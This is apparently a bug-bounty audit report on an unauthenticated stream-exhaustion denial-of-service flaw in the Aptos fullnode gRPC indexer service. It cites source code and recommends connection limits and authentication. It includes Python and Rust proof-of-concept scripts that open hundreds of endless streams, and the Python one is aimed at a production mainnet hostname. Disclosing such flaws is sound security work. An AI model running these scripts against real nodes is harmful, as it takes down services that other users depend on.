# Audit Report

## Title
Unauthenticated Connection Exhaustion Attack via Unbounded gRPC Stream Spawning in FullnodeDataService

## Summary
The `FullnodeDataService` gRPC endpoint allows unauthenticated clients to open unlimited concurrent long-lived streams via `GetTransactionsFromNode`, with each stream spawning multiple resource-intensive tasks. An attacker can exhaust node resources (file descriptors, memory, CPU) by opening many parallel streams, causing validator/fullnode degradation or failure.

## Finding Description

The `GetTransactionsFromNode` RPC method in the fullnode indexer gRPC service is vulnerable to connection exhaustion attacks due to multiple compounding issues:

**1. No Authentication or Authorization**

The `FullnodeDataService` implementation lacks any authentication checks. Unlike the `IndexerGrpcDataService` which has deprecated `whitelisted_auth_tokens` support, the fullnode service accepts connections from any client. [1](#0-0) 

**2. No Connection or Stream Limits**

The gRPC server setup only configures HTTP/2 keepalive parameters but does not set any limits on concurrent connections or streams: [2](#0-1) 

The configuration structure has no fields for connection limits or rate limiting: [3](#0-2) 

**3. Resource-Intensive Task Spawning Per Stream**

Each incoming stream request spawns a dedicated tokio task that runs a processing loop: [4](#0-3) 

Within each stream's coordinator, `processor_task_count` (default 20) concurrent fetch tasks are spawned per batch: [5](#0-4) 

Additional blocking tasks are spawned for transaction processing: [6](#0-5) 

**4. Infinite Streaming Capability**

If the optional `transactions_count` field is not set in the request, the response stream runs indefinitely until the client disconnects: [7](#0-6) [8](#0-7) 

**Attack Execution Path:**

1. Attacker opens N concurrent gRPC streams to `GetTransactionsFromNode` (e.g., 100-500 streams)
2. Each request omits `transactions_count` to enable infinite streaming
3. Each stream spawns:
   - 1 main coordinator task
   - ~20 concurrent fetch tasks per batch (processor_task_count)
   - Multiple blocking processing tasks
4. Total concurrent tasks: N Ã— (1 + 20 + processing tasks) = potentially thousands
5. Node exhausts file descriptors, memory, and CPU resources
6. Legitimate clients cannot connect or receive responses
7. Node performance degrades or crashes

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program criteria:

- **Validator node slowdowns**: Excessive task spawning causes CPU and memory contention, slowing down consensus participation and block processing
- **API crashes**: File descriptor exhaustion can crash the gRPC server, making the node's API unavailable
- **Significant protocol violations**: Breaks the Resource Limits invariant (#9) requiring all operations to respect computational limits

The attack can be executed by any unauthenticated network peer and directly impacts node availability, a critical requirement for blockchain infrastructure. While not causing permanent network partition, it can temporarily degrade or disable individual fullnodes and validators, affecting network health.

## Likelihood Explanation

**Likelihood: HIGH**

- **No authentication required**: Any client can connect without credentials
- **Simple to execute**: Standard gRPC clients (grpcurl, Python grpc, etc.) can open multiple streams
- **Low attacker cost**: Single machine can spawn hundreds of streams
- **Difficult to detect**: Looks similar to legitimate high-volume indexer usage
- **No rate limiting**: No per-IP or per-client throttling mechanisms
- **Production exposure**: Indexer gRPC endpoints are typically exposed to the public internet

The attack is trivial to execute and has been demonstrated in similar systems. The lack of any defensive measures makes exploitation highly likely if endpoints are publicly accessible.

## Recommendation

Implement multi-layered protection:

**1. Add Connection Limits at Server Level:**

```rust
// In runtime.rs bootstrap function
let tonic_server = Server::builder()
    .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
    .concurrency_limit_per_connection(10) // Limit streams per connection
    .tcp_nodelay(true)
    .add_service(reflection_service_clone);
```

**2. Add Configuration Fields:**

```rust
// In IndexerGrpcConfig
pub struct IndexerGrpcConfig {
    // ... existing fields ...
    
    /// Maximum number of concurrent gRPC streams
    pub max_concurrent_streams: Option<usize>,
    
    /// Maximum connections per IP address
    pub max_connections_per_ip: Option<usize>,
    
    /// Authentication tokens for stream access
    pub auth_tokens: Option<Vec<String>>,
}
```

**3. Implement Authentication Interceptor:**

Add token-based authentication similar to the data service, requiring clients to provide authentication headers for stream access.

**4. Add Per-Stream Resource Tracking:**

Track active streams and reject new connections when limits are exceeded:

```rust
// Add to FullnodeDataService
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    pub active_streams: Arc<AtomicUsize>, // Track active streams
    pub max_concurrent_streams: usize,
}

// In get_transactions_from_node
async fn get_transactions_from_node(...) -> Result<...> {
    let current = self.active_streams.fetch_add(1, Ordering::SeqCst);
    if current >= self.max_concurrent_streams {
        self.active_streams.fetch_sub(1, Ordering::SeqCst);
        return Err(Status::resource_exhausted("Too many concurrent streams"));
    }
    
    // ... existing code ...
    // Ensure cleanup on drop
}
```

**5. Enforce Maximum Stream Duration:**

Set mandatory timeouts or maximum transaction counts per stream to prevent indefinite streaming.

## Proof of Concept

```python
import grpc
import asyncio
from aptos.internal.fullnode.v1 import fullnode_data_pb2
from aptos.internal.fullnode.v1 import fullnode_data_pb2_grpc

async def exhaust_connections(target_host, num_streams=100):
    """
    Opens many concurrent streams to exhaust server resources.
    """
    async def open_stream(stream_id):
        try:
            channel = grpc.aio.insecure_channel(target_host)
            stub = fullnode_data_pb2_grpc.FullnodeDataStub(channel)
            
            # Request without transactions_count for infinite streaming
            request = fullnode_data_pb2.GetTransactionsFromNodeRequest(
                starting_version=0
                # Note: transactions_count is NOT set, enabling infinite stream
            )
            
            # Open stream and keep it alive
            stream = stub.GetTransactionsFromNode(request)
            print(f"[Stream {stream_id}] Opened successfully")
            
            # Consume responses slowly to keep stream alive
            async for response in stream:
                await asyncio.sleep(0.1)  # Slow consumption
                
        except Exception as e:
            print(f"[Stream {stream_id}] Error: {e}")
    
    # Spawn many concurrent streams
    tasks = [open_stream(i) for i in range(num_streams)]
    await asyncio.gather(*tasks)

# Execute attack
if __name__ == "__main__":
    target = "fullnode.mainnet.aptoslabs.com:50051"  # Example target
    asyncio.run(exhaust_connections(target, num_streams=200))
```

**Rust PoC:**

```rust
use tokio;
use tonic::Request;
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let num_streams = 200;
    let target = "http://127.0.0.1:50051";
    
    let mut handles = vec![];
    
    for i in 0..num_streams {
        let target = target.to_string();
        handles.push(tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(target).await?;
            
            // Request without transactions_count for infinite streaming
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None, // Infinite stream
            });
            
            let mut stream = client.get_transactions_from_node(request).await?.into_inner();
            
            println!("[Stream {}] Opened successfully", i);
            
            // Keep stream alive by consuming slowly
            while let Some(_response) = stream.message().await? {
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
            
            Ok::<_, tonic::Status>(())
        }));
    }
    
    futures::future::join_all(handles).await;
    Ok(())
}
```

This PoC demonstrates how an attacker can easily open hundreds of concurrent streams, each consuming server resources indefinitely, leading to resource exhaustion and denial of service.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-78)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-112)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L166-201)
```rust
        let mut tasks = vec![];
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L293-317)
```rust
    async fn get_batches(&mut self) -> Vec<TransactionBatchInfo> {
        if !self.ensure_highest_known_version().await {
            return vec![];
        }

        let mut starting_version = self.current_version;
        let mut num_fetches = 0;
        let mut batches = vec![];
        let end_version = std::cmp::min(self.end_version, self.highest_known_version + 1);

        while num_fetches < self.processor_task_count && starting_version < end_version {
            let num_transactions_to_fetch = std::cmp::min(
                self.processor_batch_size as u64,
                end_version - starting_version,
            ) as u16;

            batches.push(TransactionBatchInfo {
                start_version: starting_version,
                head_version: self.highest_known_version,
                num_transactions_to_fetch,
            });
            starting_version += num_transactions_to_fetch as u64;
            num_fetches += 1;
        }
        batches
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L67-76)
```rust
pub struct GetTransactionsFromNodeRequest {
    /// Required; start version of current stream.
    /// If not set will panic somewhere
    #[prost(uint64, optional, tag="1")]
    pub starting_version: ::core::option::Option<u64>,
    /// Optional; number of transactions to return in current stream.
    /// If not set, response streams infinitely.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
}
```
